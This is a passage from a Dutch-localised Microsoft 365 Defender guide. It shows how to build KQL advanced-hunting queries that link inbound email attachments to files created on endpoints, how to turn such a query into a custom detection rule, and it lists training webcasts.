    <span data-ttu-id="2baee-336">De resultaattabel bevat nu gegevens van het eindpunt (Microsoft Defender for Endpoints), zoals de naam van het apparaat, de actie die is uitgevoerd (in dit geval gefilterd op alleen FileCreated-gebeurtenissen) en de locatie waar het bestand is opgeslagen.</span><span class="sxs-lookup"><span data-stu-id="2baee-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="2baee-337">De naam van het account dat is gekoppeld aan het proces, wordt ook opgenomen.</span><span class="sxs-lookup"><span data-stu-id="2baee-337">The account name associated with the process will also be included.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    ```

<span data-ttu-id="2baee-338">U hebt nu een query gemaakt waarmee alle inkomende e-mailberichten worden geïdentificeerd waarbij de gebruiker de bijlage heeft geopend of opgeslagen.</span><span class="sxs-lookup"><span data-stu-id="2baee-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="2baee-339">U kunt deze query ook verfijnen om te filteren op specifieke domeinen, bestanden, bestandstypen, enzovoort.</span><span class="sxs-lookup"><span data-stu-id="2baee-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="2baee-340">Functies zijn een speciaal type join, waarmee u meer tij informatie over een bestand kunt trekken, zoals de prevalente, onderteken-en uitgeversinformatie, enzovoort.  Als u meer wilt weten over het bestand, gebruikt u de functie verrijking **FileProfile ()** .</span><span class="sxs-lookup"><span data-stu-id="2baee-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```


<span data-ttu-id="2baee-341">**Een detectie maken**</span><span class="sxs-lookup"><span data-stu-id="2baee-341">**Create a detection**</span></span>

<span data-ttu-id="2baee-342">Wanneer u een query hebt gemaakt met informatie waarover u een **melding wilt ontvangen** als ze in de toekomst plaatsvinden, kunt u een aangepaste detectie van de query maken.</span><span class="sxs-lookup"><span data-stu-id="2baee-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="2baee-343">Door aangepaste detecties wordt de query uitgevoerd volgens de frequentie die u hebt ingesteld, en met de resultaten van de query's maakt u beveiligingswaarschuwingen, op basis van de beïnvloede activa die u kiest.</span><span class="sxs-lookup"><span data-stu-id="2baee-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="2baee-344">Deze meldingen komen overeen met incidenten en kunnen worden triaged als een andere Beveiligingsmelding die wordt gegenereerd door een van de producten.</span><span class="sxs-lookup"><span data-stu-id="2baee-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="2baee-345">Op de pagina query verwijdert u de regel 7 en 8 die u hebt toegevoegd in stap 7 van de instructies voor het uitvoeren van de stappen en klikt u op **detectieregel maken**.</span><span class="sxs-lookup"><span data-stu-id="2baee-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![Schermafbeelding van waar u op detectieregel maken kunt klikken op de pagina Geavanceerde jacht](../../media/mtp/fig22.png) 

    > [!NOTE]
    > <span data-ttu-id="2baee-347">Als u klikt op **detectieregel maken** en er syntaxisfouten zijn in uw query, wordt uw detectieregel niet opgeslagen.</span><span class="sxs-lookup"><span data-stu-id="2baee-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="2baee-348">Controleer de query om te controleren of er geen fouten zijn.</span><span class="sxs-lookup"><span data-stu-id="2baee-348">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="2baee-349">Vul de vereiste velden in met de gegevens waarmee het beveiligingsteam de melding begrijpt, waarom de melding is gegenereerd en welke acties u ervan verloopt.</span><span class="sxs-lookup"><span data-stu-id="2baee-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![Schermafbeelding van de pagina detectieregel maken waarop u de details van de waarschuwing kunt definiëren](../../media/mtp/fig23.png)

    <span data-ttu-id="2baee-351">Zorg ervoor dat u de velden vult met de duidelijkheid, zodat de volgende gebruiker een weloverwogen beslissing geeft over deze detectieregel waarschuwing</span><span class="sxs-lookup"><span data-stu-id="2baee-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="2baee-352">Selecteer de entiteiten die in deze waarschuwing worden beïnvloed.</span><span class="sxs-lookup"><span data-stu-id="2baee-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="2baee-353">Selecteer **apparaat** en **Postvak** in dit geval.</span><span class="sxs-lookup"><span data-stu-id="2baee-353">In this case, select **Device** and **Mailbox**.</span></span>

    ![Schermafbeelding van de pagina detectieregel maken waarop u de parameters van de beïnvloede entiteiten kunt kiezen.](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="2baee-355">Bepaal welke actie moet worden uitgevoerd als de waarschuwing wordt geactiveerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="2baee-356">In dit geval voert u een antivirus scan uit, maar u kunt wel andere acties ondernemen.</span><span class="sxs-lookup"><span data-stu-id="2baee-356">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![Schermafbeelding van de pagina detectieregel maken waarop u een antivirus scan kunt uitvoeren wanneer een waarschuwing wordt geactiveerd voor het oplossen van bedreigingen](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="2baee-358">Selecteer het bereik voor de waarschuwingsregel.</span><span class="sxs-lookup"><span data-stu-id="2baee-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="2baee-359">Aangezien deze query gebruikmaakt van apparaten, zijn de apparaatgroepen van deze aangepaste detectie afhankelijk van de context Microsoft Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="2baee-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="2baee-360">Bij het maken van een aangepaste detectie die geen apparaten bevat als gevolg van een entiteit, is het bereik niet van toepassing.</span><span class="sxs-lookup"><span data-stu-id="2baee-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![Schermafbeelding van de pagina detectieregel maken waar u de verwachtingen voor de waarschuwingsregel kunt instellen voor de resultaten die u ziet](../../media/mtp/fig26.png) 

    <span data-ttu-id="2baee-362">Voor deze pilot kunt u de regel beperkingen toepassen op een subset van testapparaten in uw productieomgeving.</span><span class="sxs-lookup"><span data-stu-id="2baee-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="2baee-363">Selecteer **Maken**. </span><span class="sxs-lookup"><span data-stu-id="2baee-363">Select **Create**.</span></span> <span data-ttu-id="2baee-364">Selecteer vervolgens **aangepaste detectieregels** in het navigatiedeelvenster.</span><span class="sxs-lookup"><span data-stu-id="2baee-364">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![Schermafbeelding van de optie voor aangepaste detectieregels in het menu](../../media/mtp/fig27a.png) 

    ![Schermafbeelding van de pagina detectieregels waarop de regel en de details van de uitvoering worden weergegeven](../../media/mtp/fig27b.png) 

    <span data-ttu-id="2baee-367">Op deze pagina kunt u de detectieregel selecteren waarmee een detailpagina wordt geopend.</span><span class="sxs-lookup"><span data-stu-id="2baee-367">From this page, you can select the detection rule, which will open a details page.</span></span> 

    ![Schermafbeelding van de pagina met e-mailbijlagen waarop u de status van de regel uitvoer, geactiveerde waarschuwingen en acties, de detectie bewerkt, enzovoort kunt zien](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="2baee-369">Aanvullende geavanceerde jacht Walk-in-oefeningen</span><span class="sxs-lookup"><span data-stu-id="2baee-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="2baee-370">Als u meer wilt weten over een geavanceerde jacht, kunt u via de volgende webcasts de mogelijkheden van een geavanceerde jacht in Microsoft 365 Defender doorlopen om query's met meerdere pijler te maken, naar entiteiten te draaien en aangepaste detectie-en herstelacties te maken.</span><span class="sxs-lookup"><span data-stu-id="2baee-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="2baee-371">Bereid u voor voorbereiding met uw eigen GitHub-account voor het uitvoeren van de jagers-query's in uw test testomgeving.</span><span class="sxs-lookup"><span data-stu-id="2baee-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

|  <span data-ttu-id="2baee-372">Title</span><span class="sxs-lookup"><span data-stu-id="2baee-372">Title</span></span>  |  <span data-ttu-id="2baee-373">Beschrijving</span><span class="sxs-lookup"><span data-stu-id="2baee-373">Description</span></span>  |  <span data-ttu-id="2baee-374">MP4 downloaden</span><span class="sxs-lookup"><span data-stu-id="2baee-374">Download MP4</span></span>  |  <span data-ttu-id="2baee-375">Op YouTube letten</span><span class="sxs-lookup"><span data-stu-id="2baee-375">Watch on YouTube</span></span>  |  <span data-ttu-id="2baee-376">CSL-bestand voor gebruik</span><span class="sxs-lookup"><span data-stu-id="2baee-376">CSL file to use</span></span>  |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="2baee-377">Aflevering 1: basisprincipes van KQL</span><span class="sxs-lookup"><span data-stu-id="2baee-377">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="2baee-378">We bespreken de basisbeginselen van de geavanceerde jacht-functies in Microsoft 365 Defender.</span><span class="sxs-lookup"><span data-stu-id="2baee-378">We’ll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="2baee-379">Lees meer over de beschikbare geavanceerde jacht-gegevens en de Basic KQL syntaxis en operatoren.</span><span class="sxs-lookup"><span data-stu-id="2baee-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="2baee-380"> MP4</span><span class="sxs-lookup"><span data-stu-id="2baee-380"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="2baee-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="2baee-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="2baee-382">Aflevering 1: CSL-bestand in Git</span><span class="sxs-lookup"><span data-stu-id="2baee-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="2baee-383">Aflevering 2: joins</span><span class="sxs-lookup"><span data-stu-id="2baee-383">Episode 2: Joins</span></span> | <span data-ttu-id="2baee-384">We gaan verder met het leren van gegevens in de geavanceerde jacht en het samenvoegen van tabellen.</span><span class="sxs-lookup"><span data-stu-id="2baee-384">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="2baee-385">Meer informatie over binnenste, Outer, unieke en semi joins en de nuances van de standaard Kusto innerunique join.</span><span class="sxs-lookup"><span data-stu-id="2baee-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="2baee-386">MP4</span><span class="sxs-lookup"><span data-stu-id="2baee-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="2baee-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="2baee-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="2baee-388">Aflevering 2: CSL-bestand in Git</span><span class="sxs-lookup"><span data-stu-id="2baee-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="2baee-389">Aflevering 3: gegevens samenvatten, draaien en visualiseren</span><span class="sxs-lookup"><span data-stu-id="2baee-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="2baee-390">Nu kunnen we gegevens filteren, manipuleren en samenvoegen, het is tijd om te beginnen met het samenvatten, spuiten, draaien en visualiseren.</span><span class="sxs-lookup"><span data-stu-id="2baee-390">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="2baee-391">In deze aflevering houden we de operator voor samenvatten samen en maken enkele van de berekeningen die u kunt uitvoeren in extra tabellen in het schema geavanceerde jacht.</span><span class="sxs-lookup"><span data-stu-id="2baee-391">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="2baee-392">De gegevenssets worden omgezet in grafieken die de analyse kunnen helpen verbeteren.</span><span class="sxs-lookup"><span data-stu-id="2baee-392">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="2baee-393">MP4</span><span class="sxs-lookup"><span data-stu-id="2baee-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="2baee-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="2baee-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="2baee-395">Aflevering 3: CSL-bestand in Git</span><span class="sxs-lookup"><span data-stu-id="2baee-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="2baee-396">Aflevering 4: laten we beginnen.</span><span class="sxs-lookup"><span data-stu-id="2baee-396">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="2baee-397">KQL toepassen op incidenten bijhouden</span><span class="sxs-lookup"><span data-stu-id="2baee-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="2baee-398">Tijd voor het bijhouden van enkele kwaad willekeurige activiteiten.</span><span class="sxs-lookup"><span data-stu-id="2baee-398">Time to track some attacker activity!</span></span> <span data-ttu-id="2baee-399">In deze aflevering gebruiken we onze verbeterde inzichten in KQL en de Advanced jacht in Microsoft 365 Defender om een aanval bij te houden.</span><span class="sxs-lookup"><span data-stu-id="2baee-399">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="2baee-400">In dit artikel leest u enkele tips en trucs die in het veld worden gebruikt voor het bijhouden van de activiteit van derden, waaronder de ABCs van Cyber Security en hoe u ze kunt toepassen op de reactie van een incident.</span><span class="sxs-lookup"><span data-stu-id="2baee-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="2baee-401">MP4</span><span class="sxs-lookup"><span data-stu-id="2baee-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="2baee-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="2baee-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="2baee-403">Aflevering 4: CSL-bestand in Git</span><span class="sxs-lookup"><span data-stu-id="2baee-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="2baee-404">Volgende stap</span><span class="sxs-lookup"><span data-stu-id="2baee-404">Next step</span></span>
|<span data-ttu-id="2baee-405">![De fase sluiten en samenvatting](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="2baee-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="2baee-406">De fase sluiten en samenvatting</span><span class="sxs-lookup"><span data-stu-id="2baee-406">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="2baee-407">U kunt uw testresultaten van Microsoft 365 Defender analyseren, ze presenteren aan de belanghebbenden en de volgende stap volgen.</span><span class="sxs-lookup"><span data-stu-id="2baee-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

